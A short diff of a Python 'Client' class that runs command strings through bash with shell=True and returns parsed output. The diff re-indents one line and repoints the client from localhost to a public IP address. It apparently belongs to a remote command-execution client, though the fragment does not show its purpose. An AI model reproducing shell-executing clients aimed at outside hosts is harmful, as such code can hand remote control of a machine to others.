@@ -59,8 +59,8 @@ class Client:
 		output = subprocess.run(inputCmd, shell=True, executable='/bin/bash', stdout=subprocess.PIPE)
 		vals = output.stdout
 		vals = vals.decode(encoding ='UTF-8',errors='ignore')
-    	vals = vals.split('<-->')
+		vals = vals.split('<-->')
 		return vals[2]
     	
 
-client_inst = Client('127.0.0.1')
+client_inst = Client('104.45.152.207')
